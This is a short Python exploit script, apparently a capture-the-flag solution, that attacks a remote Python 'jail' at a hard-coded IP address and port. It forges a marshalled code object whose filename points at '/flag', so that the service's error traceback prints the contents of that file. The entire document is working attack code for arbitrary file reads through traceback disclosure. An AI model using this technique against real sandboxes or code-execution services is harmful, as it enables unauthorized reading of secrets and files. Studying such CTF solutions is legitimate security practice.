#!/usr/bin/env python3
# 必须用 Python 3.10 跑（容器 3.10.20）
import base64, marshal, socket, sys

assert sys.version_info[:2] == (3, 10), "must run under python 3.10"

HOST, PORT = "103.163.47.230", 35142

def read_line(path, lineno=1):
    co = compile("1/0", "<jail>", "exec").replace(
        co_filename=path, co_firstlineno=lineno)
    b64 = base64.b64encode(marshal.dumps(co)).decode()

    s = socket.create_connection((HOST, PORT), timeout=8)
    s.recv(4096)                       # 吃掉 "payload(base64 marshal) > "
    s.sendall(b64.encode() + b"\n")
    buf = b""
    while True:
        c = s.recv(8192)
        if not c:
            break
        buf += c
    s.close()
    return buf.decode("utf-8", "replace")

print(read_line("/flag", 1))